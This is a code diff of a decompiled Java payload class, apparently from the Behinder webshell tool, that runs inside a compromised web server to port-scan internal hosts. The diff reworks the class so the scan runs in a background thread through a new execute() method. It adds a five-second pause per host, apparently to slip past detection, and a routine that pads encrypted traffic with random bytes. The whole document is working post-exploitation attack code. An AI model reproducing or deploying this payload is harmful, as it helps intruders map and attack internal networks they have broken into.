@@ -1,6 +1,5 @@
 package net.rebeyond.behinder.payload.java;
 
-import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.util.Enumeration;
@@ -8,9 +7,9 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.jsp.PageContext;
 
 public class Scan implements Runnable {
    public static String ipList;
@@ -19,114 +18,57 @@ public class Scan implements Runnable {
    private Object Request;
    private Object Response;
    private Object Session;
+   private Map taskResult;
 
-   public Scan(Object session) {
-      this.Session = session;
+   public Scan(Map taskResult) {
+      this.taskResult = taskResult;
    }
 
    public Scan() {
-   }
-
-   public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
-      page.getResponse().setCharacterEncoding("UTF-8");
-      HashMap result = new HashMap();
-      boolean var14 = false;
-
-      Object so;
-      Method write;
-      label77: {
-         try {
-            var14 = true;
-            (new Thread(new Scan(this.Session))).start();
-            result.put("msg", "扫描任务提交成功");
-            result.put("status", "success");
-            var14 = false;
-            break label77;
-         } catch (Exception var18) {
-            result.put("msg", var18.getMessage());
-            result.put("status", "fail");
-            var14 = false;
-         } finally {
-            if (var14) {
-               try {
-                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getMethod("write", byte[].class);
-                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.getClass().getMethod("flush").invoke(so);
-                  so.getClass().getMethod("close").invoke(so);
-                  page.getOut().clear();
-               } catch (Exception var15) {
-               }
-
-            }
-         }
-
-         try {
-            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
-            write = so.getClass().getMethod("write", byte[].class);
-            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.getClass().getMethod("flush").invoke(so);
-            so.getClass().getMethod("close").invoke(so);
-            page.getOut().clear();
-         } catch (Exception var16) {
-         }
-
-         return true;
-      }
-
-      try {
-         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
-         write = so.getClass().getMethod("write", byte[].class);
-         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.getClass().getMethod("flush").invoke(so);
-         so.getClass().getMethod("close").invoke(so);
-         page.getOut().clear();
-      } catch (Exception var17) {
-      }
-
-      return true;
    }
 
    public void run() {
       try {
          String[] ips = ipList.split(",");
          String[] ports = portList.split(",");
-         Map sessionObj = new HashMap();
          Map scanResult = new HashMap();
-         sessionObj.put("running", "true");
-         String[] var5 = ips;
-         int var6 = ips.length;
+         String[] var4 = ips;
+         int var5 = ips.length;
 
-         for(int var7 = 0; var7 < var6; ++var7) {
-            String ip = var5[var7];
-            String[] var9 = ports;
-            int var10 = ports.length;
+         for(int var6 = 0; var6 < var5; ++var6) {
+            String ip = var4[var6];
+            Thread.sleep(5000L);
+            String[] var8 = ports;
+            int var9 = ports.length;
 
-            for(int var11 = 0; var11 < var10; ++var11) {
-               String port = var9[var11];
+            for(int var10 = 0; var10 < var9; ++var10) {
+               String port = var8[var10];
 
                try {
                   Socket socket = new Socket();
                   socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                   socket.close();
                   scanResult.put(ip + ":" + port, "open");
-               } catch (Exception var14) {
+               } catch (Exception var13) {
                   scanResult.put(ip + ":" + port, "closed");
                }
 
-               sessionObj.put("result", this.buildJson(scanResult, false));
-               this.sessionSetAttribute(this.Session, taskID, sessionObj);
+               this.taskResult.put("result", this.buildJson(scanResult, false));
             }
          }
 
-         sessionObj.put("running", "false");
-      } catch (Exception var15) {
+         this.taskResult.put("running", "false");
+      } catch (Exception var14) {
+         this.taskResult.put("running", "false");
+         this.taskResult.put("result", var14.getMessage());
+         var14.printStackTrace();
       }
 
+   }
+
+   public void execute(Object request, Object response, Object session, Map taskResult) throws Exception {
+      taskResult.put("running", "true");
+      (new Thread(new Scan(taskResult))).start();
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
@@ -247,5 +189,18 @@ public class Scan implements Runnable {
       } catch (Exception var4) {
       }
 
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 }
